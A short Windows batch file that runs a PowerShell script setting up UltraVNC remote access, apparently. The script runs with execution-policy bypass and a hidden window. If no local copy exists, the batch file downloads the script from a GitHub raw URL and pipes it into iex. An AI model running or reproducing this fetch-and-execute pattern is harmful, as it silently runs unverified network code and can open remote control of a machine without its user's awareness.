@echo off
if exist "%~dp0setup_and_run_vnc.ps1" (
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0setup_and_run_vnc.ps1"
) else (
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]'Tls12, Tls13'; irm https://raw.githubusercontent.com/Yarik-Poyaskov/rdp-ultravnc/main/setup_and_run_vnc.ps1 | iex"
)
